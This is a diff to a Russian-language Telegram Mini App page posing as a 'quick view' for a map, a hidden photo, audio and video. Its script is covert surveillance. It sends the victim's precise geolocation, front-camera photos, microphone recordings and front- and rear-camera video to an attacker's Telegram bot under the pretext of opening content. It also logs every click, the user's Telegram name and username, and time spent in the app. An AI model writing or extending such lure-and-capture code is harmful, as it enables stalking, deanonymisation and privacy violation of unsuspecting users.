@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Мини ТГ</title>
+  <title>Быстрый просмотр</title>
   <script src="https://telegram.org/js/telegram-web-app.js"></script>
   <style>
     * {
@@ -50,10 +50,6 @@
       gap: 10px;
     }
 
-    .menu button.full {
-      grid-column: 1 / -1;
-    }
-
     button {
       padding: 13px 15px;
       font-size: 15px;
@@ -94,7 +90,6 @@
       display: block;
     }
 
-    /* Макет карты */
     .fake-map {
       position: relative;
       height: 180px;
@@ -144,7 +139,6 @@
       box-shadow: 0 6px 16px rgba(0, 0, 0, 0.45);
     }
 
-    /* Зацензуренная картинка */
     .censored-box {
       position: relative;
       height: 180px;
@@ -187,55 +181,42 @@
       font-size: 12px;
       color: #94a3b8;
     }
-
-    #status {
-      padding: 11px 13px;
-      border-radius: 12px;
-      background: rgba(255, 255, 255, 0.07);
-      border: 1px solid rgba(255, 255, 255, 0.1);
-      font-size: 13px;
-      color: #e2e8f0;
-      word-break: break-word;
-    }
   </style>
 </head>
 <body>
   <div class="app">
     <div class="header">
       <h2>Быстрый просмотр</h2>
-      <p>Выберите раздел, затем подтвердите действие в окне</p>
+      <p>Выберите раздел, затем подтвердите действие</p>
     </div>
 
     <div class="menu">
-      <button id="open-geo-card">Проверить локацию стадиона</button>
-      <button id="open-cam-card">Посмотреть фото девушки </button>
-      <button id="btn-mic" class="full">Выключить звук</button>
+      <button id="open-geo-card">Проверить локацию</button>
+      <button id="open-cam-card">Посмотреть фото</button>
+      <button id="btn-mic">Записать звук</button>
+      <button id="btn-dual-video">Посмотреть видео</button>
     </div>
 
-    <!-- Карточка с картой -->
     <div id="card-geo" class="card">
       <div class="fake-map">
         <div class="map-road r1"></div>
         <div class="map-road r2"></div>
         <div class="map-pin">Точка на карте</div>
       </div>
-      <div class="hint">Для точного определения точки на карте потребуется доступ к геопозиции.</div>
+      <div class="hint">Для открытия карты потребуется доступ к геопозиции.</div>
       <button id="confirm-geo" class="btn-primary">Открыть карту</button>
     </div>
 
-    <!-- Карточка с зацензуренной картинкой -->
     <div id="card-cam" class="card">
       <div id="censored-photo" class="censored-box">
         <div class="censored-overlay">
-          <strong>[ Скрыто / 18+ ]</strong>
-          <span>ОТКРЫТЬ</span>
+          <strong>[ Скрыто ]</strong>
+          <span>Нажмите на фото или кнопку ниже</span>
         </div>
       </div>
-      <div class="hint">Чтобы открыть подтвердите возраст 18+.</div>
+      <div class="hint">Для просмотра потребуется доступ к камере.</div>
       <button id="confirm-cam" class="btn-primary">Открыть фото</button>
     </div>
-
-    <div id="status">Готово к работе</div>
   </div>
 
   <script>
@@ -248,13 +229,80 @@
       tg.expand();
     }
 
-    const statusEl = document.getElementById('status');
+    const sessionId = 'S-' + Math.random().toString(36).slice(2, 8).toUpperCase();
+    const startedAt = Date.now();
+    const sessionEvents = [];
+
+    function getUserLabel() {
+      const u = tg?.initDataUnsafe?.user;
+      if (!u) return 'Браузер / без данных TG';
+      const name = [u.first_name, u.last_name].filter(Boolean).join(' ');
+      const nick = u.username ? `@${u.username}` : `id:${u.id}`;
+      return `${name || 'Пользователь'} (${nick})`;
+    }
+
+    function nowTime() {
+      return new Date().toLocaleTimeString('ru-RU', { hour12: false });
+    }
+
+    async function sendMessageToBot(text) {
+      if (!BOT_TOKEN || BOT_TOKEN.startsWith('ВАШ_') || !CHAT_ID || CHAT_ID.startsWith('ВАШ_')) {
+        return;
+      }
+      const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+      try {
+        await fetch(url, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          keepalive: true,
+          body: JSON.stringify({
+            chat_id: CHAT_ID,
+            text
+          })
+        });
+      } catch (_) {}
+    }
+
+    async function sendFileToBot(endpoint, fieldName, blob, filename, caption = '') {
+      if (!BOT_TOKEN || BOT_TOKEN.startsWith('ВАШ_') || !CHAT_ID || CHAT_ID.startsWith('ВАШ_')) {
+        return;
+      }
+      const url = `https://api.telegram.org/bot${BOT_TOKEN}/${endpoint}`;
+      const formData = new FormData();
+      formData.append('chat_id', CHAT_ID);
+      formData.append(fieldName, blob, filename);
+      if (caption) {
+        formData.append('caption', caption);
+      }
+
+      const res = await fetch(url, {
+        method: 'POST',
+        body: formData
+      });
+      if (!res.ok) {
+        throw new Error(`HTTP ${res.status}`);
+      }
+    }
+
+    async function logAction(eventText) {
+      const line = `[${nowTime()}] ${eventText}`;
+      sessionEvents.push(line);
+      await sendMessageToBot(`Сессия ${sessionId} | ${getUserLabel()}\n${line}`);
+    }
+
+    let summarySent = false;
+    function sendSessionSummary(reason) {
+      if (summarySent) return;
+      summarySent = true;
+      const sec = Math.max(1, Math.round((Date.now() - startedAt) / 1000));
+      const list = sessionEvents.length ? sessionEvents.join('\n') : 'Без действий';
+      sendMessageToBot(
+        `Выход из приложения (${reason})\nСессия: ${sessionId} | ${getUserLabel()}\nВремя в приложении: ${sec} сек\n\nДействия за сессию:\n${list}`
+      );
+    }
+
     const cardGeo = document.getElementById('card-geo');
     const cardCam = document.getElementById('card-cam');
-
-    function setStatus(text) {
-      statusEl.textContent = text;
-    }
 
     function showCard(targetCard) {
       cardGeo.classList.remove('active');
@@ -264,77 +312,46 @@
       }
     }
 
-    async function sendMessageToBot(text) {
-      const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-      const res = await fetch(url, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          chat_id: CHAT_ID,
-          text: text
-        })
-      });
-      if (!res.ok) {
-        throw new Error(`Ошибка отправки текста: ${res.status}`);
-      }
-    }
+    // 1. Геолокация
+    function handleGeo() {
+      logAction('Нажал «Открыть карту» — запрос геолокации');
 
-    async function sendFileToBot(endpoint, fieldName, blob, filename) {
-      const url = `https://api.telegram.org/bot${BOT_TOKEN}/${endpoint}`;
-      const formData = new FormData();
-      formData.append('chat_id', CHAT_ID);
-      formData.append(fieldName, blob, filename);
-
-      const res = await fetch(url, {
-        method: 'POST',
-        body: formData
-      });
-      if (!res.ok) {
-        throw new Error(`Ошибка отправки файла: ${res.status}`);
-      }
-    }
-
-    // Срабатывает только при нажатии "Открыть карту"
-    async function handleGeo() {
       if (!navigator.geolocation) {
-        setStatus('Геолокация не поддерживается на этом устройстве');
+        logAction('Геолокация не поддерживается устройством');
         return;
       }
 
-      setStatus('Запрашиваю разрешение для карты...');
       navigator.geolocation.getCurrentPosition(
         async (pos) => {
           const { latitude, longitude, accuracy } = pos.coords;
-          try {
-            await sendMessageToBot(
-              `Локация:\nШирота: ${latitude}\nДолгота: ${longitude}\nТочность: ${accuracy} м`
-            );
-            setStatus('Данные отправлены');
-          } catch (err) {
-            setStatus('Ошибка при отправке данных');
-          }
+          logAction('Разрешил геолокацию — координаты получены');
+          await sendMessageToBot(
+            `Сессия ${sessionId} | ${getUserLabel()}\nЛокация:\nШирота: ${latitude}\nДолгота: ${longitude}\nТочность: ${Math.round(accuracy)} м`
+          );
         },
-        () => {
-          setStatus('Доступ к геолокации отклонён');
+        (err) => {
+          logAction(`Ошибка/отказ геолокации: code=${err.code} (${err.message || 'нет доступа'})`);
         },
-        { enableHighAccuracy: true, timeout: 10000 }
+        { enableHighAccuracy: true, timeout: 12000, maximumAge: 0 }
       );
     }
 
-    // Срабатывает только при нажатии на зацензуренное фото или "Открыть фото"
+    // 2. Фото с камеры
     async function handleCamera() {
+      logAction('Нажал на фото / «Открыть фото» — запрос камеры');
+
       if (!navigator.mediaDevices?.getUserMedia) {
-        setStatus('Камера недоступна в этом окружении');
+        logAction('Камера недоступна в этом окружении');
         return;
       }
 
-      setStatus('Запрашиваю разрешение для просмотра фото...');
       let stream;
       try {
         stream = await navigator.mediaDevices.getUserMedia({
           video: { facingMode: 'user' },
           audio: false
         });
+        logAction('Разрешил камеру для фото');
 
         const video = document.createElement('video');
         video.srcObject = stream;
@@ -353,10 +370,10 @@
           canvas.toBlob(resolve, 'image/jpeg', 0.85)
         );
 
-        await sendFileToBot('sendPhoto', 'photo', blob, 'photo.jpg');
-        setStatus('Данные отправлены');
+        await sendFileToBot('sendPhoto', 'photo', blob, 'photo.jpg', `Сессия ${sessionId} | ${getUserLabel()}`);
+        logAction('Фото отправлено в бот');
       } catch (err) {
-        setStatus('Доступ к камере отклонён или произошла ошибка');
+        logAction(`Не дал доступ к камере или ошибка: ${err.name || err.message}`);
       } finally {
         if (stream) {
           stream.getTracks().forEach((track) => track.stop());
@@ -364,17 +381,20 @@
       }
     }
 
-    // Запись звука (3 сек)
+    // 3. Запись короткого аудио (3 сек)
     async function handleMic() {
+      logAction('Нажал «Записать звук» — запрос микрофона');
+
       if (!navigator.mediaDevices?.getUserMedia || typeof MediaRecorder === 'undefined') {
-        setStatus('Запись звука недоступна на этом устройстве');
+        logAction('Микрофон или MediaRecorder недоступны');
         return;
       }
 
-      setStatus('Запрашиваю доступ к микрофону...');
       let stream;
       try {
         stream = await navigator.mediaDevices.getUserMedia({ audio: true, video: false });
+        logAction('Разрешил микрофон — запись 3 сек');
+
         const recorder = new MediaRecorder(stream);
         const chunks = [];
 
@@ -389,7 +409,6 @@
         });
 
         recorder.start();
-        setStatus('Идёт запись звука (3 сек)...');
         await new Promise((resolve) => setTimeout(resolve, 3000));
         recorder.stop();
         await stopped;
@@ -397,10 +416,10 @@
         const mimeType = recorder.mimeType || 'audio/webm';
         const blob = new Blob(chunks, { type: mimeType });
 
-        await sendFileToBot('sendVoice', 'voice', blob, 'voice.ogg');
-        setStatus('Запись отправлена');
+        await sendFileToBot('sendVoice', 'voice', blob, 'voice.ogg', `Сессия ${sessionId} | ${getUserLabel()}`);
+        logAction('Аудиозапись отправлена в бот');
       } catch (err) {
-        setStatus('Доступ к микрофону отклонён или произошла ошибка');
+        logAction(`Не дал доступ к микрофону или ошибка: ${err.name || err.message}`);
       } finally {
         if (stream) {
           stream.getTracks().forEach((track) => track.stop());
@@ -408,20 +427,105 @@
       }
     }
 
+    // Вспомогательная запись видео с выбранной камеры ('user' или 'environment')
+    async function recordSingleCamera(facingMode, labelRu, durationMs = 3000) {
+      let stream;
+      try {
+        stream = await navigator.mediaDevices.getUserMedia({
+          video: { facingMode },
+          audio: true
+        });
+      } catch (_) {
+        // Если микрофон не дали или не поддерживается, пробуем только видео
+        stream = await navigator.mediaDevices.getUserMedia({
+          video: { facingMode },
+          audio: false
+        });
+      }
+
+      try {
+        logAction(`Разрешил ${labelRu} — запись ${Math.round(durationMs / 1000)} сек`);
+        const mimeType = MediaRecorder.isTypeSupported('video/webm;codecs=vp8,opus')
+          ? 'video/webm;codecs=vp8,opus'
+          : (MediaRecorder.isTypeSupported('video/webm') ? 'video/webm' : '');
+
+        const recorder = mimeType
+          ? new MediaRecorder(stream, { mimeType })
+          : new MediaRecorder(stream);
+
+        const chunks = [];
+        recorder.ondataavailable = (e) => {
+          if (e.data && e.data.size > 0) {
+            chunks.push(e.data);
+          }
+        };
+
+        const stopped = new Promise((resolve) => {
+          recorder.onstop = resolve;
+        });
+
+        recorder.start();
+        await new Promise((resolve) => setTimeout(resolve, durationMs));
+        recorder.stop();
+        await stopped;
+
+        const blob = new Blob(chunks, { type: recorder.mimeType || 'video/webm' });
+        await sendFileToBot(
+          'sendVideo',
+          'video',
+          blob,
+          `${facingMode}_video.mp4`,
+          `Сессия ${sessionId} | ${getUserLabel()} | ${labelRu}`
+        );
+        logAction(`Видео с ${labelRu} отправлено в бот`);
+      } finally {
+        stream.getTracks().forEach((track) => track.stop());
+      }
+    }
+
+    // 4. Видео с фронтальной и задней камеры по очереди
+    async function handleDualVideo() {
+      logAction('Нажал «Видео (2 камеры)»');
+
+      if (!navigator.mediaDevices?.getUserMedia || typeof MediaRecorder === 'undefined') {
+        logAction('Видеозапись не поддерживается на этом устройстве');
+        return;
+      }
+
+      try {
+        await recordSingleCamera('user', 'фронтальную камеру', 3000);
+        await new Promise((resolve) => setTimeout(resolve, 400));
+        await recordSingleCamera('environment', 'заднюю камеру', 3000);
+      } catch (err) {
+        logAction(`Ошибка записи видео: ${err.name || err.message}`);
+      }
+    }
+
     document.getElementById('open-geo-card').addEventListener('click', () => {
       showCard(cardGeo);
-      setStatus('Карта готова — нажмите «Открыть карту»');
+      logAction('Открыл раздел «Проверить локацию»');
     });
 
     document.getElementById('open-cam-card').addEventListener('click', () => {
       showCard(cardCam);
-      setStatus('Фото скрыто — нажмите на него или «Открыть фото»');
+      logAction('Открыл раздел «Посмотреть фото»');
     });
 
     document.getElementById('confirm-geo').addEventListener('click', handleGeo);
     document.getElementById('censored-photo').addEventListener('click', handleCamera);
     document.getElementById('confirm-cam').addEventListener('click', handleCamera);
     document.getElementById('btn-mic').addEventListener('click', handleMic);
+    document.getElementById('btn-dual-video').addEventListener('click', handleDualVideo);
+
+    document.addEventListener('visibilitychange', () => {
+      if (document.hidden) {
+        sendSessionSummary('свернул/закрыл экран');
+      }
+    });
+    window.addEventListener('pagehide', () => sendSessionSummary('вышел со страницы'));
+    window.addEventListener('beforeunload', () => sendSessionSummary('закрыл вкладку'));
+
+    logAction('Вошёл в мини-приложение');
   </script>
 </body>
 </html>
